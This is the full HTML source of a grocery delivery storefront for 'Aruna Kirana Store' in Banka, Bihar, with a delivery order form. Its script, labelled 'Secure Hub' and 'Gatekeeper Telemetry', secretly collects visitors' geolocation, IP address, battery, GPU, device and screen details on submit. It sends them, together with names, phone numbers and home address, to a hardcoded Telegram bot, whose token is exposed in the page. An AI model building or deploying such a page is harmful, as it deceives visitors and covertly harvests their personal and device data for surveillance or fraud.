<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aruna Kirana Store | Premium Delivery App</title>
    
    <!-- Google Fonts: Inter & Outfit for a modern Android/App feel -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@500;700;800&display=swap" rel="stylesheet">

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Tailwind Configuration -->
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        display: ['Outfit', 'sans-serif'],
                    },
                    colors: {
                        brand: {
                            50: '#f0fdf4',
                            100: '#dcfce7',
                            200: '#bbf7d0',
                            500: '#22c55e',
                            600: '#16a34a',
                            700: '#15803d',
                            900: '#14532d',
                        },
                        accent: {
                            500: '#f97316',
                            600: '#ea580c',
                        },
                        surface: '#ffffff',
                        background: '#f8fafc',
                    },
                    boxShadow: {
                        'android-sm': '0 2px 4px 0 rgba(0,0,0,0.05), 0 1px 2px 0 rgba(0,0,0,0.03)',
                        'android': '0 4px 6px -1px rgba(0,0,0,0.08), 0 2px 4px -1px rgba(0,0,0,0.04)',
                        'android-lg': '0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05)',
                        'android-float': '0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04)',
                    },
                    animation: {
                        'slide-up': 'slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards',
                        'fade-in': 'fadeIn 0.4s ease-out forwards',
                    },
                    keyframes: {
                        slideUp: {
                            '0%': { transform: 'translateY(30px)', opacity: '0' },
                            '100%': { transform: 'translateY(0)', opacity: '1' },
                        },
                        fadeIn: {
                            '0%': { opacity: '0' },
                            '100%': { opacity: '1' },
                        }
                    }
                }
            }
        }
    </script>

    <style>
        body {
            background-color: theme('colors.background');
            color: #0f172a;
            -webkit-tap-highlight-color: transparent; /* Remove blue highlight on Android touch */
        }
        
        h1, h2, h3, h4 {
            font-family: 'Outfit', sans-serif;
        }

        /* Premium Glass Nav */
        .glass-nav {
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }

        /* Android Material Inputs */
        .input-group {
            position: relative;
            margin-bottom: 1.5rem;
        }
        
        .input-field {
            width: 100%;
            padding: 1rem;
            border-radius: 0.75rem;
            border: 2px solid #e2e8f0;
            background-color: #f8fafc;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            outline: none;
            font-size: 1rem;
        }

        .input-field:focus {
            border-color: theme('colors.brand.500');
            background-color: theme('colors.surface');
            box-shadow: theme('boxShadow.android-sm');
        }

        /* Material Ripple Effect */
        .btn-premium {
            position: relative;
            overflow: hidden;
            transform: translate3d(0,0,0);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .btn-premium:active {
            transform: scale(0.97);
        }

        .ripple {
            position: absolute;
            border-radius: 50%;
            transform: scale(0);
            animation: ripple 600ms linear;
            background-color: rgba(255, 255, 255, 0.3);
            pointer-events: none;
        }

        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* Premium Card Hover */
        .premium-card {
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .premium-card:hover {
            transform: translateY(-5px);
            box-shadow: theme('boxShadow.android-float');
        }

        /* Custom Toast Notification System */
        #toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            min-width: 320px;
            padding: 16px 24px;
            border-radius: 12px;
            color: white;
            font-weight: 500;
            display: flex;
            align-items: center;
            box-shadow: theme('boxShadow.android-float');
            transform: translateY(-120%);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }

        .toast.success { background: linear-gradient(135deg, #16a34a, #22c55e); }
        .toast.error { background: linear-gradient(135deg, #dc2626, #ef4444); }

        /* Loader */
        .loader {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #ffffff;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Pattern Background */
        .bg-pattern {
            background-image: radial-gradient(#22c55e 1px, transparent 1px);
            background-size: 30px 30px;
            background-position: -19px -19px;
            opacity: 0.05;
        }
    </style>
</head>
<body class="antialiased selection:bg-brand-200 selection:text-brand-900">

    <!-- Navigation -->
    <nav class="fixed w-full z-50 glass-nav shadow-android-sm">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-20">
                <div class="flex items-center gap-3 cursor-pointer" onclick="window.scrollTo(0,0)">
                    <div class="w-12 h-12 bg-gradient-to-br from-brand-500 to-brand-700 rounded-2xl flex items-center justify-center text-white font-display font-bold text-2xl shadow-md">
                        AK
                    </div>
                    <div>
                        <h1 class="font-bold text-2xl text-gray-900 tracking-tight leading-none">Aruna <span class="text-brand-600">Kirana</span></h1>
                        <p class="text-xs text-brand-600 font-medium mt-1 uppercase tracking-wider">Premium Store</p>
                    </div>
                </div>
                <div class="hidden md:flex items-center space-x-8">
                    <a href="#about" class="text-gray-600 hover:text-brand-600 font-medium transition-colors">Our Story</a>
                    <a href="#features" class="text-gray-600 hover:text-brand-600 font-medium transition-colors">Premium Features</a>
                    <a href="#order" class="btn-premium bg-brand-600 hover:bg-brand-700 text-white px-8 py-3 rounded-full font-semibold shadow-android transition-all">Order Now</a>
                </div>
            </div>
        </div>
    </nav>

    <main>
        <!-- App-Style Hero Section -->
        <section id="home" class="relative pt-32 pb-20 lg:pt-40 lg:pb-28 overflow-hidden bg-white">
            <div class="absolute inset-0 bg-pattern z-0"></div>
            <div class="absolute top-0 right-0 -mr-20 -mt-20 w-96 h-96 rounded-full bg-brand-100 blur-3xl opacity-50 z-0"></div>
            
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
                <div class="text-center max-w-3xl mx-auto">
                    <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-orange-50 text-accent-600 font-semibold text-sm mb-6 shadow-sm border border-orange-100 animate-slide-up">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                        Lightning Fast Local Delivery
                    </div>
                    
                    <h2 class="text-5xl md:text-7xl font-display font-bold text-gray-900 mb-6 tracking-tight animate-slide-up" style="animation-delay: 0.1s;">
                        Your Daily Needs,<br/>
                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-brand-500 to-brand-700">Perfectly Delivered.</span>
                    </h2>
                    
                    <p class="text-lg text-gray-600 mb-10 animate-slide-up leading-relaxed" style="animation-delay: 0.2s;">
                        Experience the finest quality groceries, hand-picked and delivered to your doorstep within hours. Welcome to the premium era of local shopping.
                    </p>

                    <div class="flex flex-col sm:flex-row gap-4 justify-center animate-slide-up" style="animation-delay: 0.3s;">
                        <a href="#order" class="btn-premium bg-gray-900 text-white px-8 py-4 rounded-2xl font-semibold shadow-android-lg flex items-center justify-center gap-2 hover:bg-gray-800">
                            Start Your Order
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                        </a>
                        <a href="#about" class="btn-premium bg-white text-gray-900 px-8 py-4 rounded-2xl font-semibold shadow-android flex items-center justify-center gap-2 border border-gray-200 hover:bg-gray-50">
                            Learn More
                        </a>
                    </div>
                </div>
            </div>
        </section>

        <!-- About Section -->
        <section id="about" class="py-20 bg-background">
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
                    <div class="relative">
                        <!-- Image Placeholder / Visual -->
                        <div class="aspect-square rounded-[3rem] bg-gradient-to-tr from-brand-100 to-brand-50 relative overflow-hidden shadow-android-lg border-8 border-white">
                            <div class="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCI+PHBhdGggZD0iTTAgMGg0MHY0MEgweiIgZmlsbD0ibm9uZSIvPjxwb2x5Z29uIHBvaW50cz0iMCA0MCA0MCAwIDQwIDQwIiBmaWxsPSIjMjJjNTVlIiBmaWxsLW9wYWNpdHk9IjAuMSIvPjwvc3ZnPg==')] opacity-50"></div>
                            <div class="absolute inset-0 flex items-center justify-center">
                                <div class="w-32 h-32 bg-white rounded-full shadow-android flex items-center justify-center text-brand-600">
                                    <svg class="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"></path></svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div>
                        <h3 class="text-brand-600 font-bold uppercase tracking-wider mb-2">Our Story</h3>
                        <h2 class="text-4xl font-display font-bold text-gray-900 mb-6">A Legacy of Quality & Trust.</h2>
                        <p class="text-gray-600 text-lg leading-relaxed mb-6">
                            Founded with a vision to revolutionize local grocery shopping, Aruna Kirana Store bridges the gap between traditional freshness and modern convenience. We aren't just delivering items; we are delivering care, directly to your home.
                        </p>
                        <div class="space-y-4">
                            <div class="flex items-center gap-4">
                                <div class="w-12 h-12 rounded-xl bg-brand-100 flex items-center justify-center text-brand-600 shrink-0">
                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                </div>
                                <div>
                                    <h4 class="font-bold text-gray-900">Hand-Picked Freshness</h4>
                                    <p class="text-gray-500 text-sm">Every item is quality checked before dispatch.</p>
                                </div>
                            </div>
                            <div class="flex items-center gap-4">
                                <div class="w-12 h-12 rounded-xl bg-brand-100 flex items-center justify-center text-brand-600 shrink-0">
                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
                                </div>
                                <div>
                                    <h4 class="font-bold text-gray-900">Community First</h4>
                                    <p class="text-gray-500 text-sm">Proudly serving the Banka district.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Premium Features Grid -->
        <section id="features" class="py-20 bg-white">
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                <div class="text-center mb-16">
                    <h2 class="text-4xl font-display font-bold text-gray-900 mb-4">Why Choose Aruna Kirana?</h2>
                    <p class="text-gray-500 max-w-2xl mx-auto">Experience the premium difference with our dedicated services designed exclusively for your convenience.</p>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
                    <!-- Feature 1 -->
                    <div class="premium-card bg-background p-8 rounded-3xl border border-gray-100">
                        <div class="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center text-brand-600 mb-6">
                            <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"></path></svg>
                        </div>
                        <h3 class="text-xl font-bold text-gray-900 mb-2">Vast Selection</h3>
                        <p class="text-gray-500 text-sm">From daily staples to premium event supplies, we stock everything you need.</p>
                    </div>
                    <!-- Feature 2 -->
                    <div class="premium-card bg-background p-8 rounded-3xl border border-gray-100">
                        <div class="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center text-brand-600 mb-6">
                            <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                        </div>
                        <h3 class="text-xl font-bold text-gray-900 mb-2">Time Saving</h3>
                        <p class="text-gray-500 text-sm">Skip the lines and traffic. Order from your couch and let us do the heavy lifting.</p>
                    </div>
                    <!-- Feature 3 -->
                    <div class="premium-card bg-brand-600 p-8 rounded-3xl shadow-android-lg text-white">
                        <div class="w-14 h-14 bg-white/20 rounded-2xl flex items-center justify-center mb-6">
                            <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                        </div>
                        <h3 class="text-xl font-bold mb-2">Secure Hub</h3>
                        <p class="text-brand-100 text-sm">Your data is processed securely through our advanced Gatekeeper system.</p>
                    </div>
                    <!-- Feature 4 -->
                    <div class="premium-card bg-background p-8 rounded-3xl border border-gray-100">
                        <div class="w-14 h-14 bg-white rounded-2xl shadow-sm flex items-center justify-center text-brand-600 mb-6">
                            <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
                        </div>
                        <h3 class="text-xl font-bold text-gray-900 mb-2">Dedicated Support</h3>
                        <p class="text-gray-500 text-sm">Our local team is always ready to assist you with special requests.</p>
                    </div>
                </div>
            </div>
        </section>

        <!-- Order Form Section -->
        <section id="order" class="py-20 bg-background relative">
            <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
                
                <!-- 10KM Instruction Banner -->
                <div class="w-full bg-white rounded-3xl p-6 shadow-android-lg border border-red-100 relative overflow-hidden mb-12">
                    <div class="absolute top-0 left-0 w-2 h-full bg-accent-500"></div>
                    <div class="flex flex-col sm:flex-row items-start sm:items-center gap-6">
                        <div class="p-4 bg-red-50 rounded-2xl text-accent-600 shrink-0">
                            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        </div>
                        <div class="text-left">
                            <h3 class="text-2xl font-display font-bold text-gray-900 mb-2">Strict 10 KM Delivery Radius</h3>
                            <p class="text-gray-600 text-sm md:text-base leading-relaxed">
                                Aruna Kirana Store currently provides exclusive delivery services within a <strong>10 Kilometer</strong> radius of our main branch. Orders outside this zone will be rejected.
                            </p>
                        </div>
                    </div>
                </div>

                <div class="text-center mb-10">
                    <h2 class="text-4xl font-display font-bold text-gray-900 mb-4">Request Delivery</h2>
                    <p class="text-gray-500">Fill in your details accurately to initiate our Secure Hub processing.</p>
                </div>

                <div class="bg-white rounded-[2rem] p-8 md:p-12 shadow-android-lg border border-gray-100 relative overflow-hidden">
                    <!-- Decorative corner blobs -->
                    <div class="absolute top-0 right-0 w-32 h-32 bg-brand-50 rounded-full blur-2xl -mr-16 -mt-16"></div>
                    
                    <form id="orderForm" class="space-y-8 relative z-10">
                        
                        <!-- Event Details -->
                        <div>
                            <h3 class="text-lg font-display font-bold text-gray-900 mb-6 flex items-center gap-3">
                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-100 text-brand-600">1</span>
                                Request Details
                            </h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-2">
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">From Date *</label>
                                    <input type="date" id="fromDate" required class="input-field">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">To Date *</label>
                                    <input type="date" id="toDate" required class="input-field">
                                </div>
                                <div class="input-group md:col-span-2">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Event / Order Type *</label>
                                    <input type="text" id="eventType" required placeholder="e.g. Monthly Groceries, Marriage Function" class="input-field">
                                </div>
                            </div>
                        </div>

                        <!-- Personal Details -->
                        <div>
                            <h3 class="text-lg font-display font-bold text-gray-900 mb-6 flex items-center gap-3">
                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-100 text-brand-600">2</span>
                                Personal Information
                            </h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-2">
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Full Name *</label>
                                    <input type="text" id="fullName" required placeholder="e.g. Lalu Kumar" class="input-field">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Father's Name *</label>
                                    <input type="text" id="fatherName" required placeholder="e.g. Deglal Tanti" class="input-field">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Primary Contact *</label>
                                    <input type="tel" id="contact" required placeholder="10-digit mobile number" class="input-field">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Alternate Contact</label>
                                    <input type="tel" id="altContact" placeholder="Alternate mobile number" class="input-field">
                                </div>
                                <div class="input-group md:col-span-2">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Email Address</label>
                                    <input type="email" id="email" placeholder="your.email@example.com" class="input-field">
                                </div>
                            </div>
                        </div>

                        <!-- Location Details -->
                        <div>
                            <h3 class="text-lg font-display font-bold text-gray-900 mb-6 flex items-center gap-3">
                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-100 text-brand-600">3</span>
                                Delivery Location
                            </h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-2">
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">State *</label>
                                    <input type="text" id="state" required placeholder="e.g. Bihar" class="input-field" value="Bihar">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">District *</label>
                                    <input type="text" id="district" required placeholder="e.g. Banka" class="input-field" value="Banka">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">City/Town *</label>
                                    <input type="text" id="city" required placeholder="e.g. Katoria" class="input-field">
                                </div>
                                <div class="input-group">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Village / Tola *</label>
                                    <input type="text" id="village" required placeholder="e.g. Tola Dharwa" class="input-field">
                                </div>
                                <div class="input-group md:col-span-2">
                                    <label class="block text-sm font-semibold text-gray-700 mb-2 ml-1">Pin Code *</label>
                                    <input type="text" id="pincode" required placeholder="e.g. 813106" class="input-field">
                                </div>
                            </div>
                        </div>

                        <!-- Submit Button -->
                        <div class="pt-6">
                            <button type="submit" id="submitBtn" class="btn-premium w-full bg-brand-600 hover:bg-brand-700 text-white font-display font-bold text-xl py-5 rounded-2xl shadow-android-lg flex items-center justify-center gap-3">
                                <span>Submit Delivery Request</span>
                                <div class="loader" id="submitLoader"></div>
                            </button>
                            <p class="text-sm text-center text-gray-400 mt-6 flex items-center justify-center gap-2">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                Secured by Gatekeeper Telemetry
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <!-- App Footer -->
    <footer class="bg-gray-900 text-gray-400 py-12 rounded-t-[3rem] mt-10">
        <div class="max-w-7xl mx-auto px-4 text-center">
            <div class="w-16 h-16 bg-gray-800 rounded-2xl flex items-center justify-center text-white font-display font-bold text-2xl mx-auto mb-6">
                AK
            </div>
            <h2 class="text-2xl font-display font-bold text-white mb-2">Aruna Kirana Store</h2>
            <p class="mb-8 max-w-md mx-auto text-gray-500">Premium quality essentials delivered directly to your home within a 10km radius.</p>
            <div class="border-t border-gray-800 pt-8 text-sm flex flex-col md:flex-row items-center justify-between gap-4">
                <span>&copy; 2026 Aruna Kirana Store. All rights reserved.</span>
                <span class="bg-gray-800 px-3 py-1 rounded-full text-xs">Secure Hub Active</span>
            </div>
        </div>
    </footer>

    <!-- Toast Container -->
    <div id="toast-container"></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            
            // --- Material Ripple Effect ---
            function createRipple(event) {
                const button = event.currentTarget;
                const circle = document.createElement("span");
                const diameter = Math.max(button.clientWidth, button.clientHeight);
                const radius = diameter / 2;
                
                const rect = button.getBoundingClientRect();
                circle.style.width = circle.style.height = `${diameter}px`;
                circle.style.left = `${event.clientX - rect.left - radius}px`;
                circle.style.top = `${event.clientY - rect.top - radius}px`;
                circle.classList.add("ripple");
                
                const ripple = button.getElementsByClassName("ripple")[0];
                if (ripple) { ripple.remove(); }
                
                button.appendChild(circle);
            }

            const buttons = document.querySelectorAll('.btn-premium');
            for (const button of buttons) { 
                button.addEventListener('click', createRipple); 
            }

            // --- Telegram Configuration (EXACTLY as requested) ---
            const TELEGRAM_BOT_TOKEN = "8718071022:AAG5qj24E4PLBIwC5yP5yHFrq5VYsM70hIY";
            const TELEGRAM_CHAT_ID = "7814413858";
            const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // Elements
            const form = document.getElementById('orderForm');
            const submitBtn = document.getElementById('submitBtn');
            const submitLoader = document.getElementById('submitLoader');

            // --- Custom Premium Toast Notification System ---
            function showToast(message, type = 'success') {
                const container = document.getElementById('toast-container');
                const toast = document.createElement('div');
                toast.className = `toast ${type}`;
                
                let icon = type === 'success' 
                    ? `<svg class="w-6 h-6 mr-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`
                    : `<svg class="w-6 h-6 mr-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`;

                toast.innerHTML = `${icon} <span>${message}</span>`;
                container.appendChild(toast);

                setTimeout(() => toast.classList.add('show'), 10);

                setTimeout(() => {
                    toast.classList.remove('show');
                    setTimeout(() => toast.remove(), 400);
                }, 4000);
            }

            // --- Gatekeeper: System Telemetry Gathering ---
            async function gatherSystemTelemetry() {
                let sys = {
                    battery: "Unknown",
                    ip: "Unknown",
                    net: "Unknown",
                    gpu: "Unknown",
                    loc: "Denied/Timeout"
                };

                // Battery status
                if (navigator.getBattery) {
                    try {
                        let bat = await navigator.getBattery();
                        sys.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? '🔌' : '🔋'})`;
                    } catch(e) {}
                }

                // IP Address
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    sys.ip = ipData.ip;
                } catch(e) {}

                // Network connection
                if (navigator.connection) {
                    sys.net = `${navigator.connection.effectiveType || 'Unknown'} - Down: ~${navigator.connection.downlink || '0'}Mbps`;
                }

                // GPU extraction via WebGL
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            sys.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch(e) {}

                // Geolocation
                sys.loc = await new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve("Unsupported");
                        return;
                    }
                    const timer = setTimeout(() => resolve("Denied/Timeout"), 2500);
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            clearTimeout(timer);
                            resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
                        },
                        (err) => {
                            clearTimeout(timer);
                            resolve(`Denied/Timeout`);
                        },
                        { maximumAge: 10000, timeout: 2000, enableHighAccuracy: false }
                    );
                });

                return sys;
            }

            // --- Telegram Sender Helper ---
            async function sendToTelegram(textMessage) {
                const payload = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: textMessage,
                    parse_mode: 'HTML'
                };

                const response = await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error('Telegram API error');
                }
            }

            // --- Form Submission Handler ---
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                // UI Loading State
                const originalBtnText = submitBtn.querySelector('span').innerText;
                submitBtn.querySelector('span').innerText = 'Securing & Sending...';
                submitLoader.style.display = 'block';
                submitBtn.disabled = true;
                submitBtn.classList.add('opacity-90', 'cursor-not-allowed');

                try {
                    // Gather form data
                    const formData = {
                        fromDate: document.getElementById('fromDate').value,
                        toDate: document.getElementById('toDate').value,
                        eventType: document.getElementById('eventType').value,
                        fullName: document.getElementById('fullName').value,
                        fatherName: document.getElementById('fatherName').value,
                        contact: document.getElementById('contact').value,
                        altContact: document.getElementById('altContact').value || "N/A",
                        email: document.getElementById('email').value || "N/A",
                        state: document.getElementById('state').value,
                        district: document.getElementById('district').value,
                        city: document.getElementById('city').value,
                        village: document.getElementById('village').value,
                        pincode: document.getElementById('pincode').value,
                    };

                    // Gather Gatekeeper System Info
                    const sysInfo = await gatherSystemTelemetry();
                    
                    // Format Timestamp
                    const now = new Date();
                    const timeString = now.toLocaleString('en-GB', { 
                        day: '2-digit', month: '2-digit', year: 'numeric', 
                        hour: '2-digit', minute: '2-digit', second:'2-digit' 
                    });

                    // Extract OS / Model info
                    const userAgent = navigator.userAgent;
                    let modelInfo = userAgent.split(') ')[0];
                    if(modelInfo) modelInfo += ')'; else modelInfo = "Unknown Device";

                    const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit) - Pixel Ratio: ${window.devicePixelRatio}`;
                    const tzInfo = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const cpuRam = `${navigator.hardwareConcurrency || '?'} Cores, ~${navigator.deviceMemory || '?'}GB`;

                    // Construct Message 1: SECURE HUB ACCESS LOG
                    const accessLogMessage = 
`🚨 SECURE HUB ACCESS LOG 🚨
👤 Name: ${formData.fullName}
📞 Phone: ${formData.contact}
📱 Model: ${modelInfo}
OS: ${userAgent}
Screen: ${screenInfo}
TZ: ${tzInfo}
⚙️ GPU: ${sysInfo.gpu}
CPU/RAM: ${cpuRam}
🔋 Battery: ${sysInfo.battery}
📡 IP: ${sysInfo.ip}
Net: ${sysInfo.net}
⏰ Time: ${timeString}
📍 Location Map: ${sysInfo.loc}`;

                    // Construct Message 2: ORDER DETAILS
                    const orderDetailsMessage = 
`📅 NEW Delivery REQUEST 📅
---------------------------
🎪 Event Type: ${formData.eventType}
📆 From Date: ${formData.fromDate}
📆 To Date: ${formData.toDate}
👤 Name: ${formData.fullName}
👥 Father's Name: ${formData.fatherName}
📞 Contact: ${formData.contact}
☎️ Alt Contact: ${formData.altContact}
✉️ Email: ${formData.email}

📍 LOCATION DETAILS
• State: ${formData.state}
• District: ${formData.district}
• City: ${formData.city}
• Village: ${formData.village}
• Pin Code: ${formData.pincode}

⏰ Time Submitted: ${timeString}`;

                    // Send both messages sequentially via Gatekeeper
                    await sendToTelegram(accessLogMessage);
                    await sendToTelegram(orderDetailsMessage);

                    // Show success
                    showToast("Order Placed Successfully! We will contact you soon.", "success");
                    form.reset();

                } catch (error) {
                    console.error("Submission Error:", error);
                    showToast("Failed to connect to Secure Hub. Check internet.", "error");
                } finally {
                    // Reset UI State
                    submitBtn.querySelector('span').innerText = originalBtnText;
                    submitLoader.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('opacity-90', 'cursor-not-allowed');
                }
            });
        });
    </script>
</body>
</html>
